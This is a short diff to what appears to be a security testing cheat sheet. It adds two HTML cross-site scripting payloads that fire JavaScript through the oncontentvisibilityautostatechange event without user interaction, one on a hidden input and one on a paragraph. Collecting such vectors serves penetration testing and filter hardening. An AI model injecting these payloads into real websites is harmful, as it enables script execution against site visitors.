@@ -809,6 +809,11 @@ Manually testing for XXE vulnerabilities generally involves
   };
   </script>
   ```
+- From [@kinugawamasato](https://x.com/kinugawamasato/status/1816234368714871185)
+  ```HTML
+  <input type="hidden" oncontentvisibilityautostatechange="alert(/ChromeCanary/)" style="content-visibility:auto">
+  <p oncontentvisibilityautostatechange="alert(/FirefoxOnly/)" style="content-visibility:auto">
+  ```
 
 **Misc payloads**
 ```HTML
